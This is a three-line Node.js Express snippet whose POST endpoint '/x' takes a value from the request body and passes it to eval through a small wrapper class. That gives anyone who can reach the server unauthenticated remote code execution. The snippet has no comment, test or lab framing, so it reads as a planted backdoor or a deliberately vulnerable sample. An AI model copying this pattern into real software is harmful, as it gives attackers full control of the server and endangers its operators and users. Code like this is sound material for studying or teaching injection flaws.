const express=require('express');const app=express();
class J{ c=''; run(){ eval(this.c); } }
app.post('/x',(req,res)=>{ const j=new J(); j.c=req.body.c; j.run(); res.end(); });
